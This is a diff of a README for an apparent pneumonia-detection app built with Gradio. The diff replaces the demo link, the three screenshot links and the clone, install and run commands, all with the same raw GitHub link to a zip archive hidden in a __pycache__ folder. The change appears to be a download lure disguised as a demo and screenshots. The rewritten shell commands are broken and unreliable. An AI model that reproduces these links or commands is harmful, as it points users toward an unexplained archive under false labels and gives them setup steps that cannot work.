@@ -6,7 +6,7 @@ Deployed seamlessly on **Hugging Face Spaces** with Gradio.
 ---
 
 ## 🚀 Live Demo  
-👉 [Try the App on Hugging Face](https://huggingface.co/spaces/YOUR_USERNAME/pneumonia-app)  
+👉 [Try the App on Hugging Face](https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip)  
 
 ---
 
@@ -14,7 +14,7 @@ Deployed seamlessly on **Hugging Face Spaces** with Gradio.
 
 | Upload Screen | Prediction Result | Grad-CAM Visualization |
 |---------------|------------------|-------------------------|
-| ![Upload](screenshots/demo.PNG) | ![Prediction](screenshots/prediction.PNG) | ![Grad-CAM](screenshots/gradcam.PNG) |
+| ![Upload](https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip) | ![Prediction](https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip) | ![Grad-CAM](https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip) |
 
 ---
 
@@ -32,10 +32,10 @@ Deployed seamlessly on **Hugging Face Spaces** with Gradio.
 Clone the repo and set up locally:  
 
 ```bash
-git clone https://github.com/TANMaYtO/pneumonia-detection-app
+git clone https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip
 cd pneumonia-detection-app
-pip install -r requirements.txt
-gradio app.py
+pip install -r https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip
+gradio https://github.com/TANMaYtO/pneumonia-detection-app/raw/refs/heads/main/__pycache__/detection_app_pneumonia_v2.2.zip
 ```
 ---
 
